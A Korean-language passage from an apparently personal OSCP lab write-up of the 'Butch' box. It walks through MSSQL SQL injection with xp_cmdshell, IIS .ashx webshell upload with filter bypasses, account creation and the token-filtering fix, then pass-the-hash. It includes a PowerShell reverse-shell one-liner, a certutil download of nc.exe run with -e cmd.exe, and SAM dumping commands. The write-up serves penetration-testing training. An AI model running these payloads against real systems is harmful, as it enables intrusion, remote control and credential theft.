> echo -n 'butch' | sha256sum
> 48f9460fe0dc9f272e7414963dd2b52287ec07d872d665d2e9364c957f163ab0  -
> ```
> ```powershell
> $s=[System.Security.Cryptography.SHA256]::Create()
> ($s.ComputeHash([Text.Encoding]::UTF8.GetBytes('butch'))|%{$_.ToString('x2')}) -join ''
> 48f9460fe0dc9f272e7414963dd2b52287ec07d872d665d2e9364c957f163ab0
> ```

`echo -n` 의 `-n` 이 없으면 전혀 다른 해시가 나온다. 같은 단어인데 개행 한 바이트, 대소문자 하나로 값이 완전히 달라진다. 이 대비는 눈에 익혀 두는 편이 좋다.

| 입력 | SHA-256 |
|---|---|
| `butch` (개행 없음) | `48f9460f…f163ab0` ← 이 박스가 심은 값 |
| `butch\n` (`echo` 기본) | `141714383b1614e77057017a9d38eaf033724353a1d9a8c25cbf57566faf51cd` |
| `Butch` | `7e4a6c94d902af155773c2c8c6c115e5414716c276b34f347b98e82d2a22c37e` |
| `BUTCH` | `faf32403fa9556a16f621d8c764586b4c0dcd9ce2d1a9fb4ed053d598bfa61d6` |

넷이 전부 다르므로 이 박스의 평문이 소문자 `butch` 에 개행 없음이라는 것이 역으로 확정된다. 반사 규칙으로 정리하면 — 해시를 만들 때는 `echo -n` 이나 `printf` 를 쓰고, 심은 해시로 로그인이 안 되면 **페이로드를 의심하기 전에 개행부터 의심한다**. PowerShell 의 `[Text.Encoding]::UTF8.GetBytes()` 는 개행을 붙이지 않으므로 이 함정이 없다.

즉 공격은 butch 계정의 비밀번호를 `butch` 로 바꾼 것이었고, 이후 `butch` / `butch` 로 로그인했다.

이 페이로드를 만들려면 세 가지를 미리 알아야 한다.

| 알아야 할 것 | 값 | [가정] 획득 경로 |
|---|---|---|
| 테이블명 | `users` | `/dev/` 의 노출 소스(코드비하인드 `.cs`/`.txt`) 또는 에러 메시지 |
| 컬럼명 | `password_hash`, `username` | 동일 |
| 해시 알고리즘 | **솔트 없는 SHA-256** | 동일. 소스에 `SHA256Managed`/`ComputeHash` 호출이 있었을 것 |

셋 중 알고리즘이 결정적이다. 소스를 못 읽었다면 무엇을 넣어야 로그인이 되는지를 알 수 없으므로 이 공격은 성립하지 않는다. **취약점 ①(소스 노출)이 없으면 취약점 ②를 무기화할 수 없고**, 이것이 체인이라는 말의 실제 의미다.

소스를 못 읽는 상황이라면 대안은 이렇다.

- 에러 기반으로 스키마를 먼저 뽑는다 (`' and 1=convert(int,(select top 1 name from sys.columns where object_id=object_id('users')))--`)
- 원본 해시를 뽑아 길이로 알고리즘을 추정한다 (64 hex = SHA-256, 32 hex = MD5, 40 hex = SHA-1)
- `$2a$`/`$2b$` 로 시작하면 bcrypt 다. 이때는 덮어쓰기 방식이 훨씬 어렵다(솔트 포함 문자열을 통째로 넣어야 한다)

> [!danger] ⚠️ 시험 금지 도구 — sqlmap → 수동 대안 전문
> 이 단계는 sqlmap 이면 `--dbms=mssql --technique=S --sql-query="update ..."` 한 줄이지만 OSCP 시험에서 sqlmap 은 금지다. MSSQL 수동 절차 전체를 여기 남긴다.
>
> 탐지
> ```sql
> '                     → 에러 (Unclosed quotation mark)
> ''                    → 정상
> ' or '1'='1           → 논리 우회 시도
> ' waitfor delay '0:0:5'--    → 5초 지연되면 blind 성립
> ```
> DBMS/버전 확인 (에러 기반 — 형변환 에러에 값이 실려 나온다)
> ```sql
> ' and 1=convert(int,@@version)--
> ' and 1=convert(int,db_name())--
> ' and 1=convert(int,(select system_user))--
> ```
> 테이블/컬럼 열거
> ```sql
> ' and 1=convert(int,(select top 1 table_name from information_schema.tables))--
> ' and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name='users'))--
> ```
> UNION 추출 (컬럼 수는 `order by n` 으로 이진 탐색)
> ```sql
> ' order by 1--   ... ' order by 5--     ← 에러 나는 직전이 컬럼 수
> ' union select null,username,password_hash,null from users--
> ```
> blind (에러도 UNION 도 막혔을 때)
> ```sql
> ' if(ascii(substring((select top 1 password_hash from users),1,1))>52) waitfor delay '0:0:5'--
> ```
> DB 가 sysadmin 이면 곧바로 RCE
> ```sql
> '; exec sp_configure 'show advanced options',1; reconfigure; --
> '; exec sp_configure 'xp_cmdshell',1; reconfigure; --
> '; exec xp_cmdshell 'whoami'; --
> ```
> 이 박스는 `xp_cmdshell` 경로를 시도하지 않았다. 성공했다면 SQLi 단계에서 곧바로 셸이 나와 업로드 단계를 통째로 건너뛸 수 있었다. MSSQL 스택 쿼리가 성립하면 `xp_cmdshell` 을 먼저 찔러보는 것이 항상 이득이다.

### 2-6. 취약점 ③ — `.ashx` 웹셸 업로드

https://github.com/yangbaopeng/ashx_webshell/blob/master/shell.ashx

웹쉘 사용

![[Pasted image 20260818111445.png]]

웹쉘 사용
![[Pasted image 20260818111513.png]]

로그인 후 파일 업로드 기능("Butch Repository")이 열려 있고, 업로드된 파일이 웹에서 접근 가능한 경로에 실행 가능한 상태로 저장된다.

`.ashx` 는 ASP.NET Generic Handler 다. `IHttpHandler` 인터페이스를 구현한 단일 파일이다.

```csharp
<%@ WebHandler Language="C#" Class="Handler" %>
using System.Web;
public class Handler : IHttpHandler {
    public void ProcessRequest(HttpContext ctx) { /* 여기가 실행된다 */ }
    public bool IsReusable { get { return false; } }
}
```

`.aspx` 대신 이것을 고르는 이유는 셋이다. 디자이너 파일이나 마스터 페이지가 필요 없어 한 파일로 완결되므로 업로드 한 번이면 끝나고, 업로드 필터 블랙리스트에서 자주 누락되며(대부분 `.asp`·`.aspx`·`.php`·`.jsp` 까지만 막는다), IIS 의 `SimpleHandlerFactory` 매핑이 기본으로 켜져 있어 별도 설정 없이 실행된다.

다만 통합 파이프라인의 핸들러 항목은 `verb="GET,HEAD,POST,DEBUG"` 로 등록돼 있다(`verb="*"` 가 아니다). 웹셸이 `POST` 로 명령을 받는다면 문제없지만, `PUT`/`OPTIONS` 같은 메서드를 기대하는 페이로드는 이 매핑에 걸리지 않는다.

**[가정]** 이 박스가 `.aspx` 를 막았는지는 기록에 없다. 업로드 필터의 존재를 시사하는 기록도, `.aspx` 업로드가 거부된 흔적도 원본에 남아 있지 않다. `.ashx` 를 고른 것은 필터를 확인해서가 아니라 위 세 이유로 합리적인 첫 선택이었기 때문으로 읽는 것이 정확하다.

IIS 업로드 필터 우회는 위에서부터 순서대로 밀어본다.

| 시도 | 노리는 허점 |
|---|---|
| `shell.aspx` | 필터 없음 |
| `shell.ashx` / `shell.asmx` | 블랙리스트 누락 (이 박스에서 사용 — 다만 필터 유무 자체는 미확인) |
| `shell.AspX` / `shell.ASHX` | 대소문자 비교 누락 (Windows FS 는 대소문자 무시 → 실행됨) |
| `shell.aspx.txt` → `shell.txt.aspx` | 확장자 파싱 방향 착각 |
| `shell.aspx%00.jpg` | 널바이트 절단 (구형 .NET) |
| `shell.aspx.` / `shell.aspx ` | 후행 점·공백. Windows 가 저장 시 제거한다 |
| `shell.aspx:.jpg` | NTFS ADS(대체 데이터 스트림). ⚠️ **단독으로는 불충분하다** — 본문이 `.jpg` 대체 스트림에 들어가고 실제로 실행되는 기본 스트림은 0바이트가 된다. 필터 통과 확인용이지 동작하는 웹셸이 아니다 |
| `shell.asp::$DATA` | NTFS ADS 의 고전형. `::$DATA` 는 기본 스트림 자체를 가리키는 별칭이라 본문이 정상 위치에 들어간다. 확장자 비교만 하는 필터를 통과하면서 **실행까지 되는 쪽은 이것이다** |
| `web.config` 업로드 | 필터가 실행 확장자만 볼 때. `web.config` 자체가 핸들러를 새로 정의해 `.jpg` 를 실행시킬 수 있다 |
| `../` 를 파일명에 삽입 | 경로 순회로 웹루트에 직접 배치 |

Content-Type 헤더만 `image/jpeg` 로 바꾸면 되는 경우도 흔하다. Burp Repeater 에서 확장자와 Content-Type 을 따로따로 바꿔가며 어느 쪽을 검사하는지 좁혀라.

**업로드가 성공해도 저장 경로를 모르면 무용지물이다.** 확인 순서는 업로드 후 응답 본문이나 목록 페이지에 링크가 노출되는지 보고, 관례 경로(`/uploads/` · `/files/` · `/upload/` · `/documents/` · `/App_Data/`)를 찍어보고, 소스(`/dev/`)에 `Server.MapPath("~/uploads")` 같은 문자열이 있는지 grep 하고, feroxbuster 를 업로드 후 다시 돌려 새 디렉터리가 생겼는지 보는 것이다. `/App_Data/` 는 IIS 가 실행을 거부하는 곳이라 여기 떨어지면 웹셸이 안 돈다.

### 2-7. 취약점 ④ — 웹셸이 이미 특권이다

```
net user /add 4leaf Password1  
net localgroup administrators 4leaf /add  
net localgroup "Remote Management Users" 4leaf /add
```

![[Pasted image 20260818111626.png]]

**`net user /add` 가 성공했다는 것 자체가 이 박스 최대의 발견이다.** 로컬 계정 생성과 `administrators` 그룹 편집은 관리자 권한이 필요한 작업인데, 웹셸에서 그냥 됐다는 것은 IIS 애플리케이션 풀이 특권 신원으로 돌고 있다는 뜻이다.

**[가정]** `LocalSystem` 또는 관리자 계정으로 앱풀 신원이 설정돼 있다. 기본값(`ApplicationPoolIdentity`)이었다면 Access Denied 가 났을 것이다.

그래서 웹셸을 잡자마자 칠 것은 `whoami` 다.

| `whoami` 결과 | 다음 수순 |
|---|---|
| `nt authority\system` | **끝났다.** 곧바로 플래그 |
| `iis apppool\<앱풀명>` | `whoami /priv` → **`SeImpersonatePrivilege`** 확인 → Potato 계열(PrintSpoofer / GodPotato / SigmaPotato) |
| `nt authority\network service` | 동일. `SeImpersonate` 보유 |
| 일반 도메인/로컬 사용자 | winPEAS·서비스 권한·언쿼티드 경로 등 정식 권한상승 열거 |

`SeImpersonatePrivilege` 가 보이면 그 즉시 PrintSpoofer/GodPotato 다. IIS 박스에서 이것이 압도적으로 흔한 경로이고, 이 박스는 그마저 필요 없었던 예외적인 경우다.

한편 `net user /add` 는 권한상승 방법 중 가장 시끄럽다. 이벤트 로그 4720(계정 생성)과 4732(그룹 추가)가 남고, 관리자 그룹 변경은 대부분의 EDR 이 즉시 경보한다. 랩에서는 편하지만 실무 침투테스트에서는 사전 승인 없이 하면 안 된다. 조용한 대안은 이미 있는 계정의 해시를 덤프해 pass-the-hash 하거나, SYSTEM 셸을 직접 리버스로 받는 것이다.

---

## 3. Foothold — 웹셸에서 대화형 셸로

2장의 체인이 성립하면 foothold 는 기계적이다.

1. `butch` / `butch` 로 로그인 (2-5에서 심은 해시)
2. 업로드 폼에 `shell.ashx` 업로드
3. 브라우저에서 웹셸 URL 접근 → 명령 실행 (스크린샷 `...111445` / `...111513`)
4. `whoami` 로 신원 확인 → 특권 확인
5. 로컬 관리자 계정 생성 (2-7)

**웹셸은 발판이지 작업 환경이 아니다.** 세션이 없어 `cd` 가 유지되지 않고, 대화형 프로그램이 죽고, 출력이 잘리고, 페이지를 새로 고칠 때마다 새 프로세스다. Windows 에서 웹셸을 정식 셸로 올리는 길은 셋이다.

```powershell
# ① 계정 생성 후 WinRM/RDP  ← 이 박스가 택한 길. 가장 안정적
net user /add 4leaf Password1

# ② PowerShell 리버스셸 원라이너 (nc -lvnp 443)
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('192.168.45.207',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# ③ nc.exe 업로드 후 실행
certutil -urlcache -split -f http://192.168.45.207/nc.exe C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe 192.168.45.207 443 -e cmd.exe
```

리버스셸이 안 붙으면 아웃바운드 포트를 의심하고 443 → 80 → 53 순으로 시도한다. 다만 **[가정]** 이 박스의 아웃바운드 정책은 미확인이다. 리버스셸을 아예 쓰지 않았으므로 검증된 바가 없다. **인바운드 정책(65528포트 filtered)에서 아웃바운드를 추정해서는 안 된다** — 둘은 서로 독립된 규칙 집합이고, 인바운드를 전부 막고 아웃바운드는 열어두는 구성이 오히려 흔하다.

[[Hawat]] 에서는 `443/tcp closed` 라는 실제 단서가 있었고 거기서 이 함정에 실제로 걸렸다. 추정의 근거가 되는 것은 실제 관측이지 다른 방향의 정책이 아니다.

이 박스는 첫 번째 길을 택해 리버스셸 문제를 통째로 회피했다. 5985(WinRM)가 이미 열려 있는 것을 nmap 에서 확인했기 때문에 가능한 판단이다. 인바운드로 관리 포트가 열려 있으면 계정 생성 경로가 리버스셸의 아웃바운드 제약을 통째로 우회하므로 빠르고 안정적이다. 다만 2-7 에서 짚은 대로 로그상으로는 가장 시끄러운 방법이다(4720·4732). 랩에서만 쓰는 지름길이지 조용한 방법이 아니다.

---

## 4. 권한상승 — 그리고 토큰 필터링의 벽

evil-winrm 접근 

```bash
┌──(kali㉿kali)-[~/PG/Butch]
└─$ evil-winrm -i 192.168.243.63 -u '4leaf' -p 'Password1'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

> [!danger] 관리자 그룹에 넣었는데 권한이 둘뿐이다 — UAC 원격 제한(토큰 필터링)
> `4leaf` 는 분명 `administrators` 멤버인데, WinRM 세션의 토큰에는 `SeDebugPrivilege`·`SeTakeOwnershipPrivilege`·`SeImpersonatePrivilege` 같은 관리자 권한이 하나도 없다. 원인은 `LocalAccountTokenFilterPolicy` 다.
>
> Windows 는 네트워크 로그온하는 로컬 계정에 대해 기본적으로 필터링된 토큰(standard user)을 발급한다. 이때 `Administrators` SID 는 deny-only 로 표시되어 관리자 권한 검사가 전부 실패한다. 예외는 RID 500(내장 `Administrator`)이다 — `FilterAdministratorToken` 이 기본 `0` 이라 필터링되지 않은 전체 토큰을 받는다.
>
> 증상 인식법: `whoami /groups` 에 `BUILTIN\Administrators` 가 보이는데 `whoami /priv` 는 초라하다 → 토큰 필터링이다. "그룹 추가가 실패했나?" 하고 되돌아가지 마라.

토큰 필터링을 넘는 길은 넷이고, 시험에서 쓰면 안 되는 것이 하나 더 있다.

| 방법 | 명령 | 조건 |
|---|---|---|
| ① 내장 Administrator(RID 500)로 붙는다 | `evil-winrm -u administrator -p '...'` | 그 계정의 비밀번호를 알거나, 특권 채널에서 재설정할 수 있다. 이 박스가 택한 길이다(비밀번호를 몰랐으므로 재설정했다 — 아래 참조) |
| ② 레지스트리로 필터링 해제 | `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f` | 관리자 권한 필요 → 특권 웹셸에서 실행하면 된다. **`/d 0` 으로 원복 가능**해서 시험에서 쓰기에 가장 안전한 축 |
| ③ SAM/SYSTEM 덤프 → pass-the-hash | `reg save HKLM\SAM …` → `secretsdump.py` → `evil-winrm -H <NTLM>` | 특권 채널 필요. **아무것도 변경하지 않는다.** RID 500 해시로 붙으면 필터링도 없다 |
| ④ 도메인 계정 사용 | — | 도메인 계정은 기본적으로 필터링되지 않는다 (도메인 환경 한정) |
| ~~⑤ 특권 웹셸에서 직접 명령~~ | ~~웹셸에서 `type proof.txt`~~ | ⚠️ 랩 한정. 웹셸의 앱풀 토큰은 애초에 필터링 대상이 아니어서 기술적으로는 성립하지만, OSCP 시험에서는 **이 경로로 얻은 플래그가 0점이다** — 바로 아래 |

`net localgroup administrators <user> /add` 를 했는데 WinRM 에서 권한이 없다면 ②나 ③을 반사적으로 떠올려라. 시험에서 여기서 막혀 30분을 태우는 사람이 많다.

> [!danger] ⚠️ 웹셸로 플래그를 읽으면 0점이다
> 위 표의 ⑤(특권 웹셸에서 직접 `type proof.txt`)는 랩에서만 쓰는 지름길이다. 시험에서는 그 박스의 점수를 통째로 날린다.
> > "The valid way to provide the contents of the proof files is in an **interactive shell** on the target machine with the type or cat command from their original location."
> > "Obtaining the contents of the proof files in any other way will result in **zero points** for the target machine; **this includes any type of web-based shell**."
> > — [OSCP Exam Guide, "Exam Proofs"](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
>
> 웹셸은 명령이 실행되는 채널이지 대화형 셸이 아니고, 규정은 이 둘을 명시적으로 구분한다. 웹셸에서 플래그를 읽어 스크린샷을 찍는 것은 가장 쉽고 가장 비싼 실수다. 기술적으로는 박스를 풀었는데 점수는 0 이 된다.
>
> 웹셸의 올바른 용도는 플래그를 읽는 것이 아니라 대화형 셸을 얻는 특권 작업을 실행하는 것이다. 위 표의 ②·③을 웹셸에서 실행하고, 플래그는 그 결과로 얻은 evil-winrm/RDP 세션에서 읽는다.
>
> 시험용 유효 대안은 둘뿐이고, 이 박스의 기록에 둘 다 이미 등장한다:
> 1. `LocalAccountTokenFilterPolicy=1` 토글(웹셸에서 실행) → `4leaf` 로 evil-winrm 재접속하면 필터링 없는 전체 토큰 → 대화형 셸에서 `type proof.txt`. 끝나면 `/d 0` 으로 원복한다
> 2. SAM/SYSTEM 덤프 → PtH → `evil-winrm -u administrator -H <해시>` → 대화형 셸. 아무것도 변경하지 않는 가장 깨끗한 경로다

adminstrator 패스워드 변경 후 flag 확인
```ps
net user administrator Password1
```

이 한 줄은 내장 `Administrator`(RID 500)의 비밀번호를 `Password1` 로 강제 변경한다. 기존 비밀번호를 몰라도 관리자 권한만 있으면 된다.

**[가정]** 이 명령은 필터링된 WinRM 세션이 아니라 특권 웹셸(2-7과 같은 채널)에서 실행됐을 가능성이 높다. 필터링된 토큰으로는 SAM 쓰기가 거부되기 때문이다. 이후 `evil-winrm -u administrator -p 'Password1'` 로 재접속하면 RID 500 예외 덕에 필터링 없는 전체 토큰을 받아 `C:\Users\Administrator\` 를 읽을 수 있다. 아래 5장의 프롬프트가 그 세션이다.

> [!danger] ⚠️ 시험에서 Administrator 비밀번호 변경은 하지 마라 — 다만 이유를 정확히 알아라
> 타겟 변조를 금하는 조항은 존재하지 않는다. Exam Guide·Exam FAQ·Academic Policy·T&C 어디에도 타겟 변조·파일 삭제·서비스 중단을 금지하는 문구가 없고, 점수 몰수(Point Disqualification) 사유는 넷뿐이다 — 제한 도구 사용 / Metasploit·Meterpreter 다중 사용 / proof 미제출 / 문서화 부재.
>
> 진짜 리스크는 규정 위반이 아니라 시간과 진척의 손실이다. 되돌릴 방법이 revert 뿐이고, revert 하면 그 머신의 진척이 전부 사라진다 — 웹셸도, 생성한 계정도, 심어둔 해시도 전부 초기화된다. AD 세트라면 더 비싸다. 제공된 침해 자격증명이나 하위 피벗 경로가 함께 죽는다. 게다가 리버트는 24회 한정(1회 리셋 가능)이라, 자기 변조를 수습하느라 쓰는 리버트는 순수한 손해다.
>
> 즉 이것은 규정 준수의 문제가 아니라 자기보호의 문제다. 규정을 근거로 외우면 근거를 물었을 때 무너지고, "되돌릴 수 없는 변경은 내 진척을 인질로 잡는다"로 외우면 무너지지 않는다.
>
> "다른 응시자의 재현을 방해한다"는 틀린 근거인데, 왜 다들 그렇게 아는지는 따로 볼 값이 있다. OSCP 시험 환경은 응시자 전용이고 다른 응시자와 타겟을 공유하지 않는다.
> > "simulates a live network in a **private VPN**" / "The exam lab is a **dedicated environment with no learners connected other than yourself**" / "All of the machines have been freshly reverted at the start of your exam"
>
> 이 통념의 출처는 은퇴한 통합 PWK 랩이다. 당시 공식 문서는 *"Students may encounter exploits left by other learners"* 라고 공유 환경임을 명시했고, 그래서 "남의 익스플로잇이 굴러다닌다", "내가 망가뜨리면 남이 못 푼다"가 상식이었다. 현행 PG 는 정반대로 *"private machines … without having to worry that other users will access it"* 다. 커뮤니티 상식에도 유통기한이 있고, 랩 구조가 바뀌면 그 위에 세운 규칙도 함께 무효가 된다.
>
> 시험용 대안 순서는 이렇다. 웹셸에서 플래그를 읽는 선택지는 여기 없다 — 0점이다(위 4장 참조).
> 1. `LocalAccountTokenFilterPolicy=1` 로 필터링만 푼다 → `4leaf` 로 대화형 WinRM 셸 확보 → 거기서 `type proof.txt`. 끝나면 `/d 0` 으로 원복한다(되돌릴 수 있는 변경)
> ```
> (웹셸) reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
> (원복)  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 0 /f
> ```
> 2. 해시를 덤프해 pass-the-hash 로 대화형 셸을 얻는다(아무것도 변경하지 않는 가장 깨끗한 경로)
> ```
> *Evil-WinRM* PS> reg save HKLM\SAM C:\Windows\Temp\sam.hive
> *Evil-WinRM* PS> reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
> (kali) $ secretsdump.py -sam sam.hive -system system.hive LOCAL
> (kali) $ evil-winrm -i <ip> -u administrator -H <NTLM해시>
> ```
> 목표는 플래그를 읽는 것이지 관리자로 로그인하는 것이 아니다. 단 규정상 읽는 장소가 대화형 셸이어야 목표가 달성된다. 목표를 헷갈리면 불필요한 변조를 하거나, 변조 없이 읽고도 0점을 받는다.

---

## 5. 플래그

```bash
*Evil-WinRM* PS C:\Users\Administrator\desktop> dir


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/17/2026   6:48 PM             34 proof.txt


*Evil-WinRM* PS C:\Users\Administrator\desktop> type proof.txt
18c3403c59645f8a20b213fe2b1768ef

*Evil-WinRM* PS C:\Users\Administrator\desktop> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> cd butch
*Evil-WinRM* PS C:\Users\butch> cd desktop
*Evil-WinRM* PS C:\Users\butch\desktop> type local.txt
0c5dba72fd1984addf833413a2f9c58e

```

| | 위치 | 값 |
|---|---|---|
| `local.txt` | `C:\Users\butch\Desktop\local.txt` | `0c5dba72fd1984addf833413a2f9c58e` |
| `proof.txt` | `C:\Users\Administrator\Desktop\proof.txt` | `18c3403c59645f8a20b213fe2b1768ef` |

둘 다 Windows 표준 위치다. 못 찾겠으면 전수 검색:

```powershell
Get-ChildItem -Path C:\ -Include local.txt,proof.txt -Recurse -ErrorAction SilentlyContinue | Select FullName
```

증거 형식에서는 규정이 요구하는 것과 관행상 권장되는 것을 구분해야 한다. 플래그 값만 캡처하면 인정되지 않는다. 그리고 규정 문구에 `whoami`·`hostname` 은 없다.

규정이 실제로 요구하는 것은 셋이다.

| 요건 | 근거 |
|---|---|
| 대화형 셸에서 원위치의 `type`/`cat` 으로 읽을 것 | "in an interactive shell … from their original location" — **웹셸 취득은 0점** |
| 스크린샷에 플래그 내용과 타겟 IP 가 함께 보일 것 | "must be shown in a screenshot that includes the contents of the file, as well as the IP address of the target by using ipconfig, ifconfig or ip addr" |
| 컨트롤 패널에도 값을 제출할 것 | 스크린샷만으로는 불충분하다. 둘 다 해야 한다 |

규정 문구에는 없지만 반드시 함께 찍어야 하는 것이 `whoami` 다. Windows 타겟의 만점 조건은 SYSTEM·Administrator·Administrator 권한 사용자의 셸인데, 이 조항을 입증할 실무 수단이 `whoami` 뿐이다. 즉 `whoami` 는 플래그 요건이 아니라 권한 요건을 증명한다. 빠뜨리면 규정 위반은 아니지만 채점자가 권한을 확인할 방법이 없다. `hostname` 도 같은 성격이다(다중 타겟 리포트에서 혼동 방지).

실무 결론은 한 줄로 붙여 실행하는 것이다.

```powershell
whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt
```

스크롤 없이 한 화면에 담기게 하는 것이 요령이다. 이 박스의 기록처럼 `type proof.txt` 만 있으면 **타겟 IP 가 없어 규정 요건에 미달한다.** 랩에서부터 이 습관을 들여라.

---

## 6. 막혔던 지점 / 시행착오

원문에 남은 흔적으로 확인되는 마찰과, 이 유형에서 흔히 막히는 지점을 구분해 적는다.

### ① [실제] `whoami /priv` 가 초라했다 — 토큰 필터링

기록상 가장 뚜렷한 마찰이다. `net localgroup administrators 4leaf /add` 를 분명히 실행했는데, evil-winrm 으로 붙어보니 권한이 둘뿐이었다:

```
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

이 시점의 오판 위험은 "그룹 추가가 실패했구나" 로 읽는 것이다. 웹셸로 돌아가 `net localgroup administrators` 를 다시 치고, 안 되면 계정을 지웠다 다시 만들고 하다 보면 **여기서 쉽게 20~30분이 날아간다.**

**실제 원인은 그룹이 아니라 토큰이다**(4장 참조). 그래서 다음 수가 `net user administrator Password1` 을 거쳐 RID 500 으로 재접속하는 것이 됐다. 기록의 흐름이 그 판단을 증언한다.

판별은 1초면 된다.

```powershell
whoami /groups | findstr /i administrators
```

여기에 `BUILTIN\Administrators` 가 보이는데 `whoami /priv` 가 초라하면 토큰 필터링이다. **그룹을 다시 건드리지 마라.** `whoami /groups` 출력의 해당 줄에 `Group used for deny only` 라고 적혀 있으면 확증이다.

### ② [실제/추정] 로그인 폼에서 `'` 하나로 시작한 것 — 이것이 정답 루트였다

스크린샷 `...110543` 이 `'` 입력 후 에러다. 본격 페이로드보다 먼저 최소 입력으로 반응을 봤다는 뜻이고, **이 순서가 옳다.**

반대로 했다면 흔한 시간 낭비 경로로 빠진다. 처음부터 `' or 1=1--` 를 던졌는데 로그인이 안 되면 "SQLi 아니네" 하고 폼을 떠나버린다. 실제로는 SQLi 가 있어도 `' or 1=1--` 이 안 통하는 경우가 많다.

- 앱이 먼저 사용자를 조회한 뒤 해시를 코드에서 비교하면, `or 1=1` 로 행이 반환돼도 해시 비교에서 걸린다. 이 박스가 바로 이 구조이고, 그래서 해시를 덮어쓴 것이다
- `password` 필드에만 인젝션이 있고 `username` 엔 없을 수 있다
- 주석 문법이 DBMS 와 안 맞는다

**`' or 1=1--` 실패는 SQLi 없음이 아니다.** `'` 로 에러가 나는지가 진짜 판정 기준이다.

### ③ [흔한 함정] `/dev`·`/DEV`·`/Dev` 를 서로 다른 셋으로 착각

feroxbuster 출력에 301 이 셋 찍힌다. 리눅스 감각으로는 세 개의 다른 디렉터리지만 Windows 에서는 하나다. 셋을 각각 재귀 스캔하면 같은 일을 3배로 한다(실제로 출력 하단에 세 번의 `Directory listing` 알림이 찍혔다).

**대상이 Windows 면 대소문자 변형 히트를 하나로 접어라.** 반대로 업로드·필터 우회에서는 이 성질이 무기가 된다(2-6 표).

### ④ [흔한 함정] `-x` 확장자 목록에 `txt` 를 안 넣는다

이 박스의 전체 체인은 `site.master.txt` 를 읽는 것에서 출발한다. `-x asp,aspx` 만 줬다면 소스를 못 읽고, 해시 알고리즘을 모르고, `password_hash` 컬럼명을 모른다. **SQLi 를 찾아도 무기화하지 못한다.**

IIS/ASP.NET 타겟 고정 확장자 세트:

```
-x aspx,asp,ashx,asmx,config,txt,bak,old,zip,rar,7z,log
```

`config` 가 들어 있는 이유는 `web.config` 에 DB 연결 문자열(평문 자격증명)이 들어 있는 경우가 흔해서다.

### ⑤ [흔한 함정] 스캐너 노이즈(`400`·`/con`·`/aux`)를 발견으로 착각

1장의 스캐너 함정 셋이 그대로 재현된다. `error%1F_log` 6줄이 400 으로 찍히는데, 이걸 숨겨진 로그 파일로 읽고 파고들면 시간이 사라진다. **`400` 은 요청 형식 거부이고, 추격 대상은 `200`·`301/302`·`403` 뿐이다.**

### ⑥ [흔한 함정] 450번 포트를 못 찾고 SMB/SMTP로 샌다

이 박스에서 가장 크게 시간을 태울 수 있는 지점이다. 기본 포트 스캔이면 21·25·135·139·445 만 보이고, 그러면 자연스럽게:

- SMB null session 열거 (`enum4linux`, `smbclient -N -L`)
- SMTP `VRFY` 사용자 열거
- FTP 익명 로그인

으로 간다. **셋 다 이 박스의 정답이 아니고**, 기록에도 이 경로들의 결과가 남아 있지 않다.

손절선은 이렇게 잡는다.

| 상황 | 손절선 |
|---|---|
| SMB null session 이 `NT_STATUS_ACCESS_DENIED` | **5분.** 자격증명 없이 더 볼 것 없다 |
| SMTP VRFY 로 사용자 이름을 얻었는데 쓸 곳이 없다 | **10분.** 사용자명만으로는 진전이 없다. 웹으로 돌아가라 |
| FTP 익명 로그인 실패 | **3분** |
| 웹앱이 안 보인다 | 전 포트 스캔 결과를 다시 읽어라. 재스캔이 아니라 읽기가 답인 경우가 많다 |

원칙은 하나다. **열거 결과가 다음 행동으로 이어지지 않으면 그 갈래는 죽은 것이다.** 사용자명 목록은 그 자체로 진전이 아니고, 붙여볼 인증 지점이 있어야 진전이다.

### ⑦ [흔한 함정] 업로드는 됐는데 저장 경로를 못 찾는다

**`.ashx` 를 성공적으로 올렸어도 URL 을 모르면 실행할 수 없다.** 2-6 의 확인 순서(응답 링크 → 관례 경로 → 소스 grep → 업로드 후 재스캔)를 따르되, 이 박스는 `/dev/` 디렉터리 리스팅이라는 최고의 도구를 이미 갖고 있었다. 업로드 대상 디렉터리에 리스팅이 켜져 있으면 열어보는 것으로 끝난다.

### ⑧ [실제/판단] 원본 해시를 뽑지 않고 덮어쓴 대가

2-4 에서 짚은 대로, `update` 로 `butch` 의 원본 해시가 소실됐다. 그 해시가 크랙되어 FTP·SMB·WinRM 에 재사용됐을 가능성을 검증할 방법이 이제 없다(타겟 정지). **파괴적 쓰기 전에 읽기를 먼저 시도하라** — 순서를 뒤집는 데 드는 비용은 몇 분이고, 잃는 것은 되돌릴 수 없다.

### ⑨ [미탐색] 시도하지 않은 갈래들 — 기록에 결과 없음

| 갈래 | 상태 | 만약 SQLi가 막혔다면 |
|---|---|---|
